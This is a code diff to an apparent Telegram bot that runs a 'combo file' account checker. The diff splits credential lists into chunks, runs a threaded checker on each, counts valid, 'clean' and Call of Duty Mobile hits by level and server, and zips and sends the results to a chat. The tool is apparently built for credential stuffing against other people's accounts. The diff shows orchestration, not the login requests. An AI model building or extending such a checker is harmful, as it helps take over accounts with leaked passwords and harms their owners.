@@ -1284,10 +1284,8 @@ def split_combo_file(combo_path, uid, chunk_size=1000):
     
     return chunk_files, total_lines, total_chunks
 
-# Replace the process_chunked_checker function with this new version:
-
 # =================================================================
-# ===================== CHUNKED CHECKER V2 =====================
+# ===================== CHUNKED CHECKER V4 =====================
 # =================================================================
 
 def process_chunked_checker(
@@ -1304,12 +1302,16 @@ def process_chunked_checker(
     loop=None
 ):
     """
-    Process combo file in 1K chunks - each chunk sends results immediately,
-    then continues to next chunk automatically.
-    Cumulative stats across all chunks.
+    Process combo file in 1K chunks.
+    Each chunk sends results immediately.
+    Auto-resume to next chunk with notification.
     """
     try:
         cfg = load_config()
+        
+        # Create main results folder
+        main_rf = Path(rf_p)
+        main_rf.mkdir(parents=True, exist_ok=True)
 
         # split into chunks
         chunk_files, total_lines, total_chunks = split_combo_file(
@@ -1319,111 +1321,61 @@ def process_chunked_checker(
         )
 
         if not chunk_files:
-            return {
-                "error": "No valid combo lines found"
-            }
+            return {"error": "No valid combo lines found"}
 
-        print(
-            f"[CHUNK MODE] "
-            f"{total_lines} lines "
-            f"-> {total_chunks} chunks (1K each)"
-        )
+        print(f"[CHUNK MODE] {total_lines} lines -> {total_chunks} chunks")
 
-        # Track cumulative stats across ALL chunks
-        final_stats = {
-            "valid": 0,
-            "invalid": 0,
-            "clean": 0,
-            "not_clean": 0,
-            "has_codm": 0,
-            "no_codm": 0,
-            "total": 0,
-            "checked": 0,
-        }
+        # Cumulative stats
+        final_stats = {"valid": 0, "invalid": 0, "clean": 0, 
+                       "not_clean": 0, "has_codm": 0, "no_codm": 0, "total": 0}
 
-        # Track cumulative level/server distribution
-        cumulative_level_dist = {}
-        cumulative_server_dist = {}
+        # Track distribution
+        all_level_dist = {}
+        all_server_dist = {}
 
-        # Create a combined result folder for ALL chunks
-        combined_rf = Path(rf_p) / "combined_results"
-        combined_rf.mkdir(parents=True, exist_ok=True)
-
-        for idx, chunk_file in enumerate(
-            chunk_files,
-            start=1
-        ):
-            # Check if stop requested
+        for idx, chunk_file in enumerate(chunk_files, start=1):
             if nstop and nstop.is_set():
-                print(f"[STOPPED] User requested stop at chunk {idx}")
                 break
 
-            # count lines in current chunk
-            chunk_lines = sum(
-                1
-                for _ in open(
-                    chunk_file,
-                    "r",
-                    encoding="utf-8",
-                    errors="ignore"
-                )
-            )
+            # Read chunk line count
+            chunk_lines = sum(1 for _ in open(chunk_file, "r", encoding="utf-8", errors="ignore"))
+            
+            print(f"[CHECKING] Chunk {idx}/{total_chunks} ({chunk_lines} lines)")
 
-            print(
-                f"[CHECKING] "
-                f"Chunk {idx}/{total_chunks} "
-                f"({chunk_lines} lines)"
-            )
+            # === STARTING CHUNK NOTIFICATION ===
+            if chat_id and loop:
+                try:
+                    asyncio.run_coroutine_threadsafe(bot.send_message(
+                        chat_id=chat_id,
+                        text=(
+                            f"📂 <b>Starting Chunk {idx}/{total_chunks}</b>\n"
+                            f"📄 Lines: {chunk_lines:,}\n"
+                            f"⏳ Processing..."
+                        ),
+                        parse_mode=ParseMode.HTML
+                    ), loop)
+                except: pass
 
-            # Update session status
+            # Update session
             with sessions_lock:
                 if u in active_sessions:
                     active_sessions[u]["status"] = "checking"
+                    active_sessions[u]["result_folder"] = str(main_rf)
                     active_sessions[u]["current_chunk"] = idx
                     active_sessions[u]["total_chunks"] = total_chunks
                     active_sessions[u]["chunk_total"] = chunk_lines
+                    # Reset live stats
+                    if "live_stats" in active_sessions[u]:
+                        ls = active_sessions[u]["live_stats"]
+                        ls.valid = ls.invalid = ls.clean = 0
+                        ls.not_clean = ls.has_codm = ls.no_codm = 0
+                        ls.total = ls.checked = 0
 
-            # Notify start of new chunk
-            if chat_id and loop:
-                try:
-                    asyncio.run_coroutine_threadsafe(
-                        bot.send_message(
-                            chat_id=chat_id,
-                            text=(
-                                f"📂 <b>Chunk {idx}/{total_chunks}</b>\n"
-                                f"📄 Lines: {chunk_lines:,}\n"
-                                f"⏳ Checking..."
-                            )
-                        ),
-                        loop
-                    )
-                except Exception as e:
-                    print("chunk notify error:", e)
-
-            # Create temp result folder for this chunk
-            chunk_rf = combined_rf / f"chunk_{idx}"
-            chunk_rf.mkdir(parents=True, exist_ok=True)
-
-            # Reset live stats for this chunk
-            with sessions_lock:
-                if u in active_sessions:
-                    live_stats = active_sessions[u].get("live_stats")
-                    if live_stats:
-                        for attr in [
-                            "valid", "invalid", "clean", 
-                            "not_clean", "has_codm", "no_codm", 
-                            "total", "checked"
-                        ]:
-                            try:
-                                setattr(live_stats, attr, 0)
-                            except:
-                                pass
-
-            # Run checker on this chunk
+            # Run checker
             fin = run_checker(
                 uid=u,
                 combo_file=chunk_file,
-                result_folder=chunk_rf,
+                result_folder=main_rf,
                 limit=chunk_lines,
                 threads=cfg["default_threads"],
                 stop_event=nstop,
@@ -1433,126 +1385,96 @@ def process_chunked_checker(
                 clean_filter=cf_filter
             )
 
-            # Parse this chunk's stats
+            # Parse distribution
             try:
-                lvl, ctr, hits = parse_result_stats(chunk_rf)
-                
-                # Merge into cumulative
+                lvl, ctr, hits = parse_result_stats(main_rf)
                 for k, v in lvl.items():
-                    cumulative_level_dist[k] = cumulative_level_dist.get(k, 0) + v
+                    all_level_dist[k] = all_level_dist.get(k, 0) + v
                 for k, v in ctr.items():
-                    cumulative_server_dist[k] = cumulative_server_dist.get(k, 0) + v
+                    all_server_dist[k] = all_server_dist.get(k, 0) + v
+                print(f"[STATS] Chunk {idx}: {hits} hits")
             except Exception as e:
-                print(f"Error parsing chunk {idx} stats: {e}")
+                print(f"[STATS ERROR] {e}")
 
-            # Merge chunk stats into final stats
+            # Add to cumulative stats
             if isinstance(fin, dict):
                 for k, v in fin.items():
-                    if isinstance(v, (int, float)):
-                        final_stats[k] = final_stats.get(k, 0) + v
+                    if isinstance(v, (int, float)) and k in final_stats:
+                        final_stats[k] += v
 
-            print(
-                f"[DONE] Chunk {idx}/{total_chunks}"
-            )
+            print(f"[DONE] Chunk {idx}/{total_chunks}")
 
-            # Build stats dict with distribution for this chunk
-            chunk_stats = {
-                **final_stats,
-                "level_dist": cumulative_level_dist,
-                "server_dist": cumulative_server_dist,
-                "current_chunk": idx,
-                "total_chunks": total_chunks,
-            }
-
-            # ZIP AND SEND RESULTS IMMEDIATELY FOR THIS CHUNK
+            # ZIP results
             ts_chunk = datetime.now().strftime("%Y%m%d_%H%M%S")
             zip_name = f"results_{u}_chunk_{idx}_{ts_chunk}.zip"
-            chunk_zip = combined_rf.parent / zip_name
+            chunk_zip = main_rf.parent / zip_name
             
-            zip_results(chunk_rf, chunk_zip)
-
-            # Send chunk results immediately
-            if chat_id and loop and chunk_zip.exists():
-                try:
-                    asyncio.run_coroutine_threadsafe(
-                        deliver_results(
-                            bot, 
-                            chat_id, 
-                            u, 
-                            [chunk_zip], 
-                            chunk_stats,
-                            combo_file=None,
-                            partial=False
-                        ),
-                        loop
-                    )
-                except Exception as e:
-                    print(f"Failed to send chunk {idx} results: {e}")
-
-            # DON'T DELETE - keep for final stats later
-            # (We'll clean up after ALL chunks done)
-
-            # Small delay between chunks
-            time.sleep(1)
-
-        # Update final stats with cumulative distribution
-        final_stats["level_dist"] = cumulative_level_dist
-        final_stats["server_dist"] = cumulative_server_dist
-        final_stats["total_chunks"] = total_chunks
-
-        # Final message - ALL chunks done
-        if chat_id and loop:
             try:
-                asyncio.run_coroutine_threadsafe(
-                    bot.send_message(
-                        chat_id=chat_id,
-                        text=(
-                            "✅ <b>ALL CHUNKS COMPLETE!</b>\n\n"
-                            f"📂 Total Chunks: {total_chunks}\n"
-                            f"📄 Total Lines: {total_lines:,}\n\n"
-                            f"📊 Total Hits: {final_stats.get('has_codm', 0):,}\n"
-                            f"✅ Valid: {final_stats.get('valid', 0):,}\n"
-                            f"✨ Clean: {final_stats.get('clean', 0):,}"
-                        )
-                    ),
-                    loop
-                )
+                zip_results(main_rf, chunk_zip)
             except:
                 pass
 
-        # NOW cleanup all chunk folders
-        try:
-            import shutil
-            # Clean up individual chunk folders
-            for chunk_folder in combined_rf.iterdir():
-                if chunk_folder.is_dir():
-                    shutil.rmtree(chunk_folder)
-        except:
-            pass
+            # === SEND RESULTS WITH DISTRIBUTION ===
+            if chat_id and loop and chunk_zip.exists():
+                chunk_stats = {
+                    **final_stats,
+                    "level_dist": all_level_dist,
+                    "server_dist": all_server_dist,
+                    "current_chunk": idx,
+                    "total_chunks": total_chunks,
+                }
+                try:
+                    asyncio.run_coroutine_threadsafe(deliver_results(
+                        bot, chat_id, u, [chunk_zip], chunk_stats,
+                        combo_file=None, partial=False), loop)
+                except: pass
+
+            # === AUTO-RESUME NOTIFICATION ===
+            if chat_id and loop and idx < total_chunks:
+                try:
+                    asyncio.run_coroutine_threadsafe(bot.send_message(
+                        chat_id=chat_id,
+                        text=(
+                            f"✅ <b>Chunk {idx} Complete!</b>\n"
+                            f"📊 Total Hits so far: {final_stats.get('has_codm', 0):,}\n"
+                            f"⏳ <b>Auto-Resuming...</b>\n"
+                            f"Starting chunk {idx+1} in 3 seconds..."
+                        ),
+                        parse_mode=ParseMode.HTML
+                    ), loop)
+                except: pass
+
+            # Wait between chunks
+            if idx < total_chunks:
+                print(f"[WAIT] 3 seconds before next chunk...")
+                time.sleep(3)
+
+        # Final summary
+        final_stats["level_dist"] = all_level_dist
+        final_stats["server_dist"] = all_server_dist
+        final_stats["total_chunks"] = total_chunks
+
+        if chat_id and loop:
+            try:
+                asyncio.run_coroutine_threadsafe(bot.send_message(
+                    chat_id=chat_id,
+                    text=(
+                        f"✅ <b>ALL CHUNKS COMPLETE!</b>\n\n"
+                        f"📂 Chunks: {total_chunks}\n"
+                        f"📄 Lines: {total_lines:,}\n\n"
+                        f"📊 Total Hits: {final_stats.get('has_codm', 0):,}\n"
+                        f"✅ Valid: {final_stats.get('valid', 0):,}\n"
+                        f"✨ Clean: {final_stats.get('clean', 0):,}"
+                    ),
+                    parse_mode=ParseMode.HTML
+                ), loop)
+            except: pass
 
         return final_stats
 
     except Exception as e:
         print(f"[CHUNK ERROR] {e}")
-
-        try:
-            if chat_id and loop:
-                asyncio.run_coroutine_threadsafe(
-                    bot.send_message(
-                        chat_id=chat_id,
-                        text=(
-                            "❌ Chunk checker failed\n"
-                            f"{e}"
-                        )
-                    ),
-                    loop
-                )
-        except:
-            pass
-
-        return {
-            "error": str(e)
-        }
+        return {"error": str(e)}
 
 # ════════════════════════════════════════════
 #  CHECKER RUNNER
@@ -4277,8 +4199,24 @@ async def on_callback(update,context):
                     # Use LiveStats.total as accurate processed counter
                     done_count = cur_stats.get("total", 0)
                     if disp and done_count > disp: done_count = disp
-                    card = stats_card(done_count, disp, cur_stats, ll, cl,
-                                       result_folder=str(rf))
+                    # ── Use combined_results folder if in chunked mode ───
+                    try:
+                        combined_rf = Path(rf) / "combined_results"
+                        if combined_rf.exists():
+                            # Parse distribution from results
+                            lvl_dist, ctr_dist, _ = parse_result_stats(combined_rf)
+                            cur_stats["level_dist"] = lvl_dist
+                            cur_stats["server_dist"] = ctr_dist
+                            card = stats_card(done_count, disp, cur_stats, ll, cl,
+                                               result_folder=str(combined_rf))
+                        else:
+                            # Normal mode
+                            card = stats_card(done_count, disp, cur_stats, ll, cl,
+                                               result_folder=str(rf))
+                    except:
+                        # Fallback
+                        card = stats_card(done_count, disp, cur_stats, ll, cl,
+                                           result_folder=str(rf))
                     try:
                         asyncio.run_coroutine_threadsafe(
                             context.bot.edit_message_text(
